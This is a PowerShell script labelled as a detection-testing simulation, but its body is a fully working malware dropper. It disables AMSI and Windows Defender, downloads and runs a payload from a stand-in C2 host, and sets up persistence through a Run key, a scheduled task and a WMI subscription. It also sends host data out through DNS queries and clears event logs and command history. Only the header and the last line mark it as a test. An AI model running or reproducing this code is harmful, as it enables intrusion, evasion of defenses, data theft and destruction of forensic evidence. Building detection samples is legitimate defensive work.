# PowerShell Dropper Script - TEST SIMULATION ONLY
# DO NOT EXECUTE - For security detection testing

# Bypass execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Disable AMSI (Anti-Malware Scan Interface)
$a = [Ref].Assembly.GetTypes() | ForEach-Object {
    if ($_.Name -like "*iUtils") {
        $_.GetFields('NonPublic,Static') | ForEach-Object {
            if ($_.Name -like "*Context") {
                [IntPtr]$ptr = $_.GetValue($null)
                [Int32[]]$buf = @(0)
                [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
            }
        }
    }
}

# Disable Windows Defender real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

# Add exclusion paths
Add-MpPreference -ExclusionPath "C:\Windows\Temp" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:APPDATA" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue

# Download payload from C2
$C2_URL = "https://malicious-server.onion/payload.exe"
$PAYLOAD_PATH = "$env:TEMP\svchost.exe"

try {
    # Method 1: WebClient
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $wc.DownloadFile($C2_URL, $PAYLOAD_PATH)
} catch {
    try {
        # Method 2: Invoke-WebRequest
        Invoke-WebRequest -Uri $C2_URL -OutFile $PAYLOAD_PATH -UseBasicParsing
    } catch {
        # Method 3: BITS Transfer
        Start-BitsTransfer -Source $C2_URL -Destination $PAYLOAD_PATH
    }
}

# Execute payload
if (Test-Path $PAYLOAD_PATH) {
    # Run with elevated privileges
    Start-Process -FilePath $PAYLOAD_PATH -WindowStyle Hidden
}

# Create persistence
# Registry Run key
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegPath -Name "WindowsUpdate" -Value $PAYLOAD_PATH

# Scheduled Task
$Action = New-ScheduledTaskAction -Execute $PAYLOAD_PATH
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsUpdateTask" -Action $Action -Trigger $Trigger -Principal $Principal -Force

# WMI Event Subscription (fileless persistence)
$FilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = 'WindowsUpdateFilter'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    QueryLanguage = 'WQL'
}
$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'WindowsUpdateConsumer'
    CommandLineTemplate = $PAYLOAD_PATH
}
$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs

# Steal credentials using Mimikatz-style technique
$code = @"
using System;
using System.Runtime.InteropServices;

public class CredentialStealer {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);
    
    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaEnumerateLogonSessions(out uint LogonSessionCount, out IntPtr LogonSessionList);
}
"@

# Exfiltrate system information
$SystemInfo = @{
    Hostname = $env:COMPUTERNAME
    Username = $env:USERNAME
    Domain = $env:USERDOMAIN
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
    IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress
    Processes = Get-Process | Select-Object Name, Id | ConvertTo-Json
}

# Send to C2
$JsonData = $SystemInfo | ConvertTo-Json
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($JsonData)
$EncodedData = [Convert]::ToBase64String($Bytes)

# DNS exfiltration
$chunks = $EncodedData -split '(.{63})' | Where-Object { $_ }
foreach ($chunk in $chunks) {
    Resolve-DnsName -Name "$chunk.exfil.malicious.onion" -Type TXT -ErrorAction SilentlyContinue
}

# Clean up traces
Clear-EventLog -LogName Security -ErrorAction SilentlyContinue
Clear-EventLog -LogName System -ErrorAction SilentlyContinue
Clear-EventLog -LogName Application -ErrorAction SilentlyContinue
Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Force -ErrorAction SilentlyContinue

Write-Host "[!] POWERSHELL DROPPER SIMULATION - TEST FILE ONLY"
